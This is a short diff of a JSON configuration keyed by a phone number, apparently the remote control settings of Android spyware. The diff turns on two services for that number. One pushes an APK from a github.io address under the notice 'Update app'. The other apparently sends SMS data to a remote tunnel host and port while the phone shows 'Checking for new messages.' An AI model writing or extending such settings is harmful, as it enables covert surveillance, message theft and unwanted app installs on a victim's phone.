@@ -17,7 +17,7 @@
 	},
 	"+918290448340": {
 		"download_install": {
-			"service_enable": false,
+			"service_enable": true,
 			"update_now": false,
 			"pkg_install_enable": true,
 			"download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
@@ -25,7 +25,7 @@
 			"notification_msg": "Update app"
 		},
 		"sms_update": {
-			"service_enable": false,
+			"service_enable": true,
 			"remote_host": "fine-louisiana.at.ply.gg",
 			"remote_port": 9752,
 			"notification_msg": "Checking for new messages."
